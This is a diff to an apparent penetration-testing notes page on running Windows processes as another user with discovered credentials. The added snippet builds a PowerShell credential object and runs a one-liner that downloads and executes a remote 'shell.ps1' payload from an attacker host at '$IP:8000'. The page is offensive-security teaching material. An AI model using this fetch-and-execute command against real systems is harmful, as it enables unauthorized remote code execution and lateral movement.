@@ -14,10 +14,21 @@ Many times the enumeration efforts result in some new credentials being found. S
 
 You can also start a local process as another user from CMD/PowerShell using the `runas` command. This will start a new window as that user after filling in the correct password:
 
-{% code title="sudo" %}
+{% code title="sudo interactively" %}
 ```powershell
 runas /user:j0r1an powershell  # local
 runas /user:corp\j0r1an powershell  # domain
+```
+{% endcode %}
+
+The above only works in an RDP setting where you interactively type the password. For shells instead, you can use PowerShell to create a new process with your credentials:
+
+{% code title="sudo using PowerShell" overflow="wrap" %}
+```powershell
+$pass = ConvertTo-SecureString '$PASSWORD' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("$USERNAME", $pass)
+
+Start-Process -Credential ($cred) -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://$IP:8000/shell.ps1')"  # Run your payload here
 ```
 {% endcode %}
 
